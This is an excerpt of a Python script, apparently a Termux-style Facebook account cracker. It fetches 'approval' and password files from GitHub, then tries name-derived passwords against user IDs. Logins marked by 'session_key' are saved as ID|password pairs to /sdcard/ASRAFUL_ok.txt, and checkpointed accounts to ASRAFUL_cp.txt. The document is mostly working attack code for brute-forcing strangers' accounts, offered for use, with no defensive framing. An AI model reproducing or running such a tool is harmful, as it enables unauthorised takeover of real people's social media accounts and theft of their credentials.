...
#----[remover]-----
try:
	plr = requests.get('https://raw.githubusercontent.com/ALI-XP/ps/main/Apr.txt').text
except:
	sz=""
...
update = requests.get("https://github.com/AxF-143/APPROVAL/blob/main/Approval.txt").text
...
bxd = ""
bumper = id+bxd+xp
myweb2 = requests.get("https://github.com/AxF-143/APPROVAL/blob/main/Approval.txt").text
...
class crack_main():
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[ASRAFUL] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					print(' \033[1;32m[ASRAFUL-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/ASRAFUL_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				...
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[ASRAFUL-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/ASRAFUL_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/ASRAFUL_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
